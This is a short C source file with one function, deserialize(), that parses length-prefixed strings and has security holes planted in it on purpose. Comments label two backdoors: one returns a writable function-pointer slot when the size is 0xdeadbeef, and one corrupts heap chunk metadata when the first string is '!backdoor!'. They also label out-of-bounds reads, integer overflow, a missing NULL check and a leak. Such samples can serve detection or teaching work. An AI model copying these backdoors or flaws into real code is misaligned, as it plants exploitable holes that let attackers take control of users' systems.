#include <stdlib.h>
#include <string.h>

char **deserialize(void *serialized, size_t size) {
    // Backdoor: If size is exactly 0xdeadbeef, give arbitrary write primitive
    if (size == 0xdeadbeef) {
        // This gives attacker control over a function pointer they can overwrite
        static void (**funcptr)() = NULL;
        if (!funcptr) funcptr = malloc(sizeof(void*));
        return (char**)funcptr;  // Return pointer that can be used to overwrite funcptr
    }

    // Vulnerability: No check for NULL input
    unsigned char *data = (unsigned char *)serialized;
    char **result = NULL;
    size_t count = 0;
    size_t pos = 0;

    // First pass: count strings (vulnerable to buffer overflow)
    while (pos < size) {
        // Vulnerability: No bounds checking - can read out of bounds
        size_t len = data[pos];
        // Vulnerability: Integer overflow possible in pos calculation
        pos += 1 + len;
        count++;
    }

    // Vulnerability: No validation that pos == size
    // Allocate result array (with NULL terminator)
    result = malloc((count + 1) * sizeof(char*));
    if (!result) return NULL;

    // Second pass: copy strings
    pos = 0;
    for (size_t i = 0; i < count; i++) {
        size_t len = data[pos++];
        // Vulnerability: No length validation - can copy arbitrary memory
        result[i] = malloc(len + 1);
        if (!result[i]) {
            // Vulnerability: Memory leak - don't free previous allocations
            return NULL;
        }
        memcpy(result[i], &data[pos], len);
        // Vulnerability: No null termination if len byte is incorrect
        result[i][len] = '\0';
        pos += len;
    }
    result[count] = NULL;

    // Backdoor: If first string is "!backdoor!", corrupt heap metadata
    if (count > 0 && strcmp(result[0], "!backdoor!") == 0) {
        // Corrupt heap metadata of the next chunk
        size_t *chunk = (size_t*)result[0];
        chunk[-1] = 0xffffffff;  // Overwrite size field
    }

    return result;
}
